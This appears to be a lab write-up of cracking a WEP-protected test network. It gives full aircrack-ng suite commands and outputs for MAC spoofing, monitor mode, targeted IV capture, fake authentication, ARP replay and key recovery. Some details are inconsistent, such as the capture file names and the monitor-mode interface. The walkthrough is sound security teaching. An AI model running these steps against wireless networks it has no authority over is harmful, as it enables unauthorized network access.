---
slug: "wireless-labs/wep-cracking-walkthrough"
event: "wireless-labs"
title: "WEP Cracking Walkthrough"
summary: "Step-by-step WEP cracking run in a controlled lab: monitor mode setup, targeted capture, fake authentication, ARP replay, and key recovery from collected IVs."
date: 2026-05-13
tags:
  - wireless
  - 802-11
  - wep
  - aircrack-ng
  - airodump-ng
  - aireplay-ng
  - monitor-mode
category: "network"
difficulty: "info"
platform: "other"
draft: false
---

# LAB 1: WEP Cracking Walkthrough

## 1.0 Objective

The objective of this lab is to demonstrate why **WEP encryption is insecure** by capturing WEP wireless packets, generating traffic, collecting enough IVs, and using `aircrack-ng` to recover the WEP key. This walkthrough is only for the authorized lab network. The lab guide requires using Kali/BackTrack with tools such as `airmon-ng`, `macchanger`, `airodump-ng`, `aireplay-ng`, and `aircrack-ng`.

---

## 2.0 Wireless Adapter Detection

First, the wireless adapter was checked using:

```bash
sudo airmon-ng
```

The adapter was detected successfully:

```text
Interface: wlan0
Driver: ath9k_htc
Chipset: Qualcomm Atheros AR9271 802.11n
```
![pasted-image-20260513101633](/images/writeups/wireless-labs/wep-cracking-walkthrough/pasted-image-20260513101633.png)

This confirms that the wireless adapter supports monitor mode and can be used for packet capturing.

---

## 3.0 Killing Conflicting Processes

Before enabling monitor mode, conflicting wireless processes were stopped:

```bash
sudo airmon-ng check kill
```

Output:

```text
Killing these processes:
PID Name
262804 wpa_supplicant
```

![pasted-image-20260513101704](/images/writeups/wireless-labs/wep-cracking-walkthrough/pasted-image-20260513101704.png)

This prevents NetworkManager or `wpa_supplicant` from interfering with monitor mode.

---

## 4.0 MAC Address Spoofing

The interface was brought down:

```bash
sudo ip link set wlan0 down
```
![pasted-image-20260513101756](/images/writeups/wireless-labs/wep-cracking-walkthrough/pasted-image-20260513101756.png)

Then the MAC address was changed to the lab MAC address:

```bash
sudo macchanger --mac 00:11:22:33:44:55 wlan0
```
![pasted-image-20260513101826](/images/writeups/wireless-labs/wep-cracking-walkthrough/pasted-image-20260513101826.png)
Verification:

```bash
macchanger -s wlan0
```

Output:

```text
Current MAC:   00:11:22:33:44:55
Permanent MAC: [REDACTED_MAC]
```
![pasted-image-20260513101904](/images/writeups/wireless-labs/wep-cracking-walkthrough/pasted-image-20260513101904.png)
This proves that the adapter MAC address was successfully spoofed.

---

## 5.0 Enabling Monitor Mode

Monitor mode was enabled using:

```bash
sudo airmon-ng start wlan0mon
```
![pasted-image-20260513101933](/images/writeups/wireless-labs/wep-cracking-walkthrough/pasted-image-20260513101933.png)
The new monitor interface was created as:

```text
wlan0mon
```

Verification command:

```bash
iw dev
```

Output showed:

```text
Interface wlan0mon
type monitor
```
![pasted-image-20260513102005](/images/writeups/wireless-labs/wep-cracking-walkthrough/pasted-image-20260513102005.png)
This confirms the adapter is ready to capture wireless packets.

---

## 6.0 Scanning Wireless Networks

Nearby wireless networks were scanned using:

```bash
sudo airodump-ng wlan0mon
```

The WEP lab target was found:

```text
BSSID: [REDACTED_MAC]
Channel: 6
Encryption: WEP
Cipher: WEP
ESSID: irfanxirfan
```

![pasted-image-20260513102133](/images/writeups/wireless-labs/wep-cracking-walkthrough/pasted-image-20260513102133.png)

![pasted-image-20260513102223](/images/writeups/wireless-labs/wep-cracking-walkthrough/pasted-image-20260513102223.png)

[REDACTED_MAC]  -68       33        3    0   6   54e  WEP  WEP         irfanxirfan 

The scan also showed another WEP network, but the selected target for this lab was `irfanxirfan`.

---

## 7.0 Capturing WEP Packets

A targeted capture was started against the WEP network:

```bash
sudo airodump-ng -c 6 --bssid [REDACTED_MAC] --ivs -w wep_fast wlan0mon
```
![pasted-image-20260513102542](/images/writeups/wireless-labs/wep-cracking-walkthrough/pasted-image-20260513102542.png)

Explanation:

|Option|Meaning|
|---|---|
|`-c 6`|Locks capture to channel 6|
|`--bssid`|Targets the selected AP only|
|`--ivs`|Saves useful WEP IVs|
|`-w wep_fast`|Saves capture as `wep_fast-xx.ivs`|
|`wlan0mon`|Monitor mode interface|

During capture, the data count increased successfully:

```text
#Data: 18557
#/s: 404
ENC: WEP
AUTH: SKA
ESSID: irfanxirfan
```

This shows that the capture was collecting enough WEP data packets.

---

## 8.0 Fake Authentication

Fake authentication was performed to associate the spoofed MAC with the access point:

```bash
sudo aireplay-ng -1 6000 -o 1 -q 10 \
-a [REDACTED_MAC] \
-h 00:11:22:33:44:55 \
-e irfanxirfan wlan0mon
```

![pasted-image-20260513102614](/images/writeups/wireless-labs/wep-cracking-walkthrough/pasted-image-20260513102614.png)

Purpose:

```text
To make the AP accept packets from the spoofed MAC address.
```

The spoofed station appeared in `airodump-ng`:

```text
[REDACTED_MAC]  00:11:22:33:44:55
```

This confirms the fake client was visible to the AP.

---

## 9.0 ARP Replay Attack

To speed up IV collection, ARP replay was launched:

```bash
sudo aireplay-ng -3 -x 300 \
-b [REDACTED_MAC] \
-h 00:11:22:33:44:55 wlan0mon
```

![pasted-image-20260513102646](/images/writeups/wireless-labs/wep-cracking-walkthrough/pasted-image-20260513102646.png)

Earlier replay output showed that ARP replay was working:

```text
got 4 ARP requests and 18983 ACKs
sent 19041 packets
```

This means the AP was responding to replayed packets, generating more encrypted WEP traffic.

---

## 10.0 Checking Capture Files

The capture files were listed:

```bash
ls -lt wep_fast*.ivs wep_irfanxirfan*.cap 2>/dev/null | head
```

![pasted-image-20260513102708](/images/writeups/wireless-labs/wep-cracking-walkthrough/pasted-image-20260513102708.png)

The newest useful file was:

```text
wep_fast-01.ivs
```

The older file `wep_fast-02.ivs` only contained:

```text
Got 1057 out of 5000 IVs
```

Therefore, the correct file to crack was the newest capture file.

---

## 11.0 Cracking the WEP Key

The WEP cracking command was:

```bash
sudo aircrack-ng -a 1 -b [REDACTED_MAC] wep_fast-01.ivs
```

![pasted-image-20260513102857](/images/writeups/wireless-labs/wep-cracking-walkthrough/pasted-image-20260513102857.png)

Explanation:

|Option|Meaning|
|---|---|
|`-a 1`|Forces WEP attack mode|
|`-b`|Specifies target BSSID|
|`wep_fast-03.ivs`|Captured IV file|

If needed, multiple captures can be combined:

```bash
sudo aircrack-ng -a 1 -b [REDACTED_MAC] \
wep_fast-03.ivs \
wep_irfanxirfan-02.cap \
replay_arp-*.cap
```

Successful cracking should display:

```text
KEY FOUND! [ XX:XX:XX:XX:XX ]
```

The colons must be removed before entering the key as the Wi-Fi password.

Example:

```text
KEY FOUND! [ 12:34:56:78:90 ]
WEP Key: 1234567890
```

---

## 12.0 Findings

This lab proves that WEP is insecure because it uses weak IV handling. By collecting enough WEP IVs, `aircrack-ng` can perform a statistical attack and recover the key. The main factor is not only the password length, but the number of useful IVs captured.

---

## 13.0 Conclusion

The WEP cracking lab was performed by identifying the wireless adapter, enabling monitor mode, scanning for WEP networks, capturing packets, using fake authentication, generating ARP replay traffic, and cracking the captured IV file. The result demonstrates that WEP should not be used in real wireless networks. Modern networks should use WPA2 or WPA3 with a strong passphrase.
